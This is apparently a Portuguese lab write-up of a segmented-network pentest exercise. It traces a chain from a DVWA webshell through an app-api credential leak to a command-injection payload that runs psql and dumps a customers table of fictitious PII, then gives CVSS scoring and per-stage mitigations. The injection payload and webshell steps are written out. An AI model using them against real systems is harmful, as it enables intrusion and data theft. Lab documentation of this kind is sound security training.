# Stage 06 — Cadeia de Ataque Completa (DMZ → APP → DB → Exfiltração)

Núcleo da Parte 3, no modelo fiel ao enunciado ("foothold na DMZ → alcance a APP →
da APP, chegue ao DB → exfiltre"). A segmentação NUNCA foi furada: o DB permaneceu
inacessível da DMZ; a exfiltração só ocorreu operando de DENTRO da APP.

## Diagrama da cadeia
```
[Você/VPN] --F-VPN--> [WAF:8080] --> [DVWA] --upload--> webshell (RCE, www-data)
   |                                  (origem 172.30.10.x, DMZ)
   |                                          |
   |    (1) GET /internal/db-config  --F1-->  | app-api vaza a credencial do DB
   |                                          |
   |    (2) GET /internal/net-check  --F1-->  | command injection = RCE na APP
   |        ?host=127.0.0.1; psql ...         | (agora você "está" na APP, 172.30.20.x)
   |                                          |
   |                    psql -U appuser (cred roubada) --F2--> [postgres:5432] (DB)
   |                                          |
   +<------------------ dados sensíveis exfiltrados <---------+
```

## Elo 1 — Foothold (RCE na DMZ)
Upload de webshell PHP no DVWA → `?cmd=whoami` → `www-data`. (ver `02-file-upload-foothold.md`)

## Elo 2 — Movimento lateral DMZ → APP (regra F1)
Do webshell (origem 172.30.10.x), alcança a app-api:
```
php file_get_contents('http://172.30.20.10:8000/')  →  {"service":"app-api","status":"ok"}
```
Pré-requisito descoberto: o container DVWA precisava de rota default (gateway padrão),
como qualquer host real. Com ela, quem governa DMZ→APP é a regra F1 (decisão explícita).

## Elo 3 — Roubo da credencial (VULN-1)
Endpoint interno sem autenticação vaza a cred do banco:
```
php file_get_contents('http://172.30.20.10:8000/internal/db-config')
-> {"db_host":"172.30.30.10","db_name":"labdb","db_user":"appuser","db_password":"<REDIGIDO>",...}
```

## Elo 4 — Segmentação protege o DB da DMZ (defesa funcionando)
Mesmo COM a credencial, o DVWA (DMZ) NÃO alcança o Postgres direto:
```
php fsockopen('172.30.30.10',5432) da DMZ  ->  falha (F2 barra DMZ->DB)
```
A credencial sozinha, da DMZ, é inútil — a rede impede o acesso direto. Para usá-la,
é preciso operar de DENTRO da APP.

## Elo 5 — RCE na APP + reúso da credencial (VULN-4)
A app-api tem um endpoint de "diagnóstico" interno que concatena input no shell
(command injection). Via webshell → F1 → app-api, o atacante ganha execução NA APP e,
dali, usa a credencial roubada com o cliente `psql` para alcançar o DB (F2) e dumpar:
```
GET /internal/net-check?host=127.0.0.1; psql postgresql://appuser:<CRED>@172.30.30.10:5432/labdb -c 'SELECT * FROM customers' 2>&1
```
Resultado (exfiltrado):
```
 id |    name     |      email       |     credit_card     |     ssn
----+-------------+------------------+---------------------+-------------
  1 | Alice Silva | alice@corp.local | 4111 1111 1111 1111 | 123-45-6789
  2 | Bruno Costa | bruno@corp.local | 5500 0000 0000 0004 | 987-65-4321
  3 | Carla Souza | carla@corp.local | 3400 0000 0000 009  | 456-78-9012
(3 rows)
```
Aqui a credencial roubada é ESSENCIAL: o `psql` autentica com ela. É o clássico
"loot and reuse" — roubar credencial e reusá-la num pivô mais fundo.

## Por que a segmentação foi mantida
O DB ficou inacessível da DMZ o tempo todo (Elo 4). A exfiltração só foi possível
atravessando a cadeia legítima DMZ→APP→DB, abusando de falhas de APLICAÇÃO
(cred exposta + command injection), não de furos de rede. Stage 8 (hardening) fecha
as falhas de aplicação sem mexer na política de firewall.

## Impacto / CVSS
Comprometimento total da confidencialidade do banco (PII fictícia) a partir de um
único ponto de entrada web. Conjunto: **9.8 (Crítico)** — RCE inicial + exposição de
credencial + RCE no pivô encadeados.

## Mitigações (Stage 8, por elo)
- Elo 1: validar upload (extensão/MIME/magic bytes), store fora do webroot, WAF On.
- Elo 2/lateral: restringir F1 a endpoints específicos; egress-filtering na DMZ.
- Elo 3: exigir auth/mTLS interno; remover endpoint de debug; secrets manager.
- Elo 5: remover exec de shell / validar input (allowlist); least-privilege no role do DB
  (o `appuser` não deveria poder ler `customers`, nem ser superuser).
